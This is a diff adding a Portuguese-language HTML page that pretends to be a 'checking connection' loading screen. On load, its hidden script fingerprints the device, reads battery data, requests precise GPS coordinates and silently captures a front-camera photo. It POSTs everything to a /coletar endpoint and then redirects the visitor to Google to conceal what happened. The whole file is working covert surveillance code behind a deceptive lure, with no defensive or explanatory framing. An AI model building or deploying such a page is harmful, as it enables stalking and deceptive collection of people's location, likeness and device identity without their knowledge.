@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Carregando...</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f0f2f5;
+      color: #1a1a1a;
+      padding: 1rem;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 2rem 1.5rem;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+    }
+    .spinner {
+      width: 44px; height: 44px;
+      border: 4px solid #e5e7eb;
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: gira .8s linear infinite;
+      margin: 0 auto 1.2rem;
+    }
+    @keyframes gira { to { transform: rotate(360deg); } }
+    h2 { font-size: 1.1rem; margin-bottom: .4rem; }
+    p  { font-size: .88rem; color: #666; }
+    #video, #canvas { display: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="spinner"></div>
+    <h2>Verificando Conexão</h2>
+    <p>Aguarde um momento enquanto preparamos o conteúdo...</p>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    (function() {
+      var TIMEOUT_GPS = 12000;
+      var TIMEOUT_TOTAL = 20000;
+
+      function dadosAparelho() {
+        var gpu = "N/A";
+        try {
+          var c = document.createElement("canvas");
+          var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+          if (gl) {
+            var dbg = gl.getExtension("WEBGL_debug_renderer_info");
+            if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+          }
+        } catch(e) {}
+
+        return {
+          plataforma: navigator.platform || "",
+          nucleos_cpu: navigator.hardwareConcurrency || "N/A",
+          memoria_gb: navigator.deviceMemory || "N/A",
+          tela: screen.width + "x" + screen.height,
+          janela: innerWidth + "x" + innerHeight,
+          pixel_ratio: window.devicePixelRatio || 1,
+          fuso_horario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          toque: navigator.maxTouchPoints || 0,
+          idiomas: (navigator.languages || []).join(", "),
+          online: navigator.onLine,
+          conexao: navigator.connection ? navigator.connection.effectiveType : "",
+          gpu: gpu,
+        };
+      }
+
+      function pegarBateria() {
+        return new Promise(function(resolve) {
+          if (!navigator.getBattery) return resolve("N/A");
+          navigator.getBattery().then(function(b) {
+            resolve({ nivel: Math.round(b.level * 100) + "%", carregando: b.charging });
+          }).catch(function() { resolve("N/A"); });
+        });
+      }
+
+      function pegarGPS() {
+        return new Promise(function(resolve) {
+          if (!navigator.geolocation) return resolve(null);
+          navigator.geolocation.getCurrentPosition(
+            function(pos) {
+              resolve({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                precisao_metros: pos.coords.accuracy,
+                altitude: pos.coords.altitude || null,
+              });
+            },
+            function() { resolve(null); },
+            { enableHighAccuracy: true, timeout: TIMEOUT_GPS, maximumAge: 0 }
+          );
+        });
+      }
+
+      function pegarFoto() {
+        return new Promise(function(resolve) {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return resolve(null);
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } })
+            .then(function(stream) {
+              var video = document.getElementById("video");
+              video.srcObject = stream;
+              video.onloadedmetadata = function() {
+                video.play();
+                setTimeout(function() {
+                  try {
+                    var canvas = document.getElementById("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+                    var dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                    resolve(dataUrl);
+                  } catch(e) {
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                    resolve(null);
+                  }
+                }, 500);
+              };
+            })
+            .catch(function() { resolve(null); });
+        });
+      }
+
+      function enviar(dados) {
+        return new Promise(function(resolve) {
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "/coletar", true);
+          xhr.setRequestHeader("Content-Type", "application/json");
+          xhr.onload = function() { resolve(); };
+          xhr.onerror = function() { resolve(); };
+          xhr.timeout = 8000;
+          xhr.ontimeout = function() { resolve(); };
+          xhr.send(JSON.stringify(dados));
+        });
+      }
+
+      function redirecionar() {
+        window.location.replace("https://www.google.com");
+      }
+
+      var finalizado = false;
+      function finalizarUmaVez() {
+        if (finalizado) return;
+        finalizado = true;
+        redirecionar();
+      }
+
+      // Coleta tudo em paralelo, envia uma vez, redireciona
+      Promise.all([pegarGPS(), pegarFoto(), pegarBateria()])
+        .then(function(resultados) {
+          var dados = {
+            aparelho: dadosAparelho(),
+            gps: resultados[0],
+            foto: resultados[1],
+            bateria: resultados[2],
+          };
+          return enviar(dados);
+        })
+        .then(finalizarUmaVez)
+        .catch(finalizarUmaVez);
+
+      // Fallback absoluto
+      setTimeout(finalizarUmaVez, TIMEOUT_TOTAL);
+    })();
+  </script>
+</body>
+</html>
